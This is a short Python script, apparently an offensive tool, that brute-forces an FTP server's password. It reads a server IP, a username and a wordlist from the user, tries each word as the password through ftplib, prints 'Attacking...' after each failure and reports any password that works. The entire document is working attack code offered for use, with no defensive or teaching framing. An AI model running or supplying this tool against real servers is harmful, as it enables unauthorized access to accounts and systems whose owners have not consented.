# ////////////////////////
# ************************
#
# Simple FTP bruteforcing script.
#
# ************************
# ////////////////////////

import ftplib
import time

IP = input(f'Please enter IP address of the FTP server: ')

user = input(f'Enter username: ')

PassList = input(f'Wordlist path:')

try:
    
    with open(PassList, 'r') as list:
        for word in list:
            word = word.strip('\r').strip('\n')

            try:
                conn = ftplib.FTP(IP)
                conn.login(user,word)
                print(f'Correct password for user {user} is: {word}')

            except:
                time.sleep(5)
                print(f'Attacking...')

except:
    print(f'No valid wordlist provided!')